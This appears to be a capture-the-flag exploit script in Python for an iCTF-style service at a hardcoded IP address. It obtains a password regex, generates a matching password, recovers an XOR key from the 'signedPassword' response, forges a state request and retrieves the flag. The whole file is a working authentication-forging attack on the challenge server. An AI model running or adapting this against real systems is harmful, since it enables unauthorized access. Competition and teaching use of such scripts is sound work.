import requests
import rstr
import json
port = 9002
host = 'http://67.159.89.33:{}'
endpoints = {'flag':'/flag','token':'/accessToken','state':'/state','/':'/'}
password = 'blah'
try:
    while True:
        r = requests.post(host.format(port) + endpoints['token'], json={'password':password})
        regexp = rstr.xeger(r.text[r.text.find('pwReq')+8:r.text.find('$')+1])
        r = requests.post(host.format(port) + endpoints['token'], json={'password':regexp})
        if 'signedPassword' in r.text:
            aa = json.loads(r.text)
            pw_int = int.from_bytes(regexp.encode(), 'big')
            key = int(aa['signedPassword'])^pw_int
            r = requests.post(host.format(port) + endpoints['state'],json={'signedPassword':key^1337})
            if 'port' in r.text:
                jsonp = json.loads(r.text)
                r = requests.get(host.format(jsonp['port'])+endpoints['flag']+'?token={}'.format(jsonp['token']))
                if 'ictf' in r.text:
                    flag = r.text.split('\n')[1][4:-4]
                    print('flag: {}'.format(flag))
                    break
except Exception as e:
    print('exception: {}'.format(e))
